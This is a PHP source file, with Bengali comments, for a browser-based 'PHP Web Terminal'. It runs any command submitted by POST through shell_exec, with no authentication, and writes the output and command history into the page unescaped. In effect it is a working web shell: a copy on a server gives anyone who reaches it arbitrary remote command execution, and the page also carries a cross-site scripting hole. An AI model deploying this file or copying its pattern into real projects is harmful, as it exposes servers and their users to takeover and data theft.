<?php
session_start();

// যদি current working directory (cwd) সেট না থাকে, তাহলে সেটি নির্ধারণ করুন
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd(); // initial path
}

// কমান্ড হিস্টরি ধারণ করতে
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = array();
}

$output = '';
if (isset($_POST['command'])) {
    $command = $_POST['command'];  // ইউজার থেকে কমান্ড নেয়া

    // cd কমান্ড হলে ডিরেক্টরি চেঞ্জ করো
    if (preg_match('/^cd\s+(.*)/', $command, $matches)) {
        $newDir = trim($matches[1]);

        // যদি পাথটি রিলেটিভ হয়, তাহলে সেটি বর্তমান ডিরেক্টরির সাথে যোগ করো
        if (!preg_match('/^\//', $newDir)) {
            $newDir = rtrim($_SESSION['cwd'], '/') . '/' . $newDir;
        }

        // নতুন ডিরেক্টরি যদি মজুত থাকে, তবে সেটি সেশন থেকে আপডেট করো
        if (is_dir($newDir)) {
            $_SESSION['cwd'] = realpath($newDir);
            $output = "Directory changed to: " . $_SESSION['cwd'];
        } else {
            $output = "Directory not found: $newDir";
        }
    } else {
        // অন্য কোনো কমান্ড হলে সেটি রান করো
        $cwd = $_SESSION['cwd'];
        $output = shell_exec("cd " . escapeshellarg($cwd) . " && $command 2>&1");
    }

    // কমান্ড হিস্টরিতে যোগ করা
    array_push($_SESSION['history'], $command);

    // আউটপুট এবং নতুন ডিরেক্টরি পাথ পাঠানো
    echo json_encode(['output' => $output, 'cwd' => $_SESSION['cwd'], 'history' => $_SESSION['history']]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Terminal</title>
    <style>
        body {
            background-color: #1e1e2f;
            color: #eee;
            font-family: monospace;
            padding: 20px;
        }
        .terminal-box {
            background-color: #2d2d44;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px #000;
            width: 90%;
            max-width: 800px;
            margin: auto;
            height: 500px;
            overflow-y: auto;
            position: relative;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: #eee;
            margin-top: 10px;
        }
        button {
            padding: 10px 15px;
            background-color: #00b894;
            border: none;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        pre {
            background-color: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        .output {
            margin-top: 15px;
        }
        .history {
            font-size: 0.9em;
            color: #aaa;
        }
        #prompt {
            color: #00b894;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="terminal-box">
        <h2>🖥️ PHP Web Terminal</h2>
        <p><strong>Current Directory:</strong> <span id="cwd"><?php echo $_SESSION['cwd']; ?></span></p>
        
        <!-- Command Input Form -->
        <form id="commandForm">
            <span id="prompt">[$(cwd)]$ </span>
            <input type="text" id="commandInput" placeholder="কমান্ড লিখুন যেমন: ls, cd folder, git status" autofocus />
            <button type="submit">Run</button>
        </form>

        <div id="outputArea" class="output"></div>

        <!-- Command History -->
        <div id="historyArea" class="history"></div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            let historyIndex = -1;  // To navigate through history
            let commandHistory = [];  // Store history commands
            let userInput = '';

            // AJAX request to execute command
            $('#commandForm').on('submit', function(e) {
                e.preventDefault();
                
                let command = $('#commandInput').val();
                if (!command) return;

                $('#outputArea').html('Running command...');

                $.ajax({
                    type: 'POST',
                    url: '',  // Same file
                    data: { command: command },
                    dataType: 'json',
                    success: function(response) {
                        // Show output and update current directory
                        $('#outputArea').html('<pre>' + response.output + '</pre>');
                        $('#cwd').text(response.cwd);

                        // Show command history
                        commandHistory = response.history;
                        let historyHTML = '<h3>History:</h3><ul>';
                        commandHistory.forEach((cmd, index) => {
                            historyHTML += `<li>${cmd}</li>`;
                        });
                        historyHTML += '</ul>';
                        $('#historyArea').html(historyHTML);

                        // Clear input field after command
                        $('#commandInput').val('');
                    },
                    error: function() {
                        $('#outputArea').html('<pre>Error occurred while executing command.</pre>');
                    }
                });
            });

            // Handle key press for history navigation (up/down arrow)
            $('#commandInput').on('keydown', function(e) {
                if (e.key === 'ArrowUp') {
                    // Navigate up in history
                    if (historyIndex < commandHistory.length - 1) {
                        historyIndex++;
                        $('#commandInput').val(commandHistory[historyIndex]);
                    }
                } else if (e.key === 'ArrowDown') {
                    // Navigate down in history
                    if (historyIndex > 0) {
                        historyIndex--;
                        $('#commandInput').val(commandHistory[historyIndex]);
                    } else {
                        historyIndex = -1;
                        $('#commandInput').val('');
                    }
                }
            });
        });
    </script>
</body>
</html>



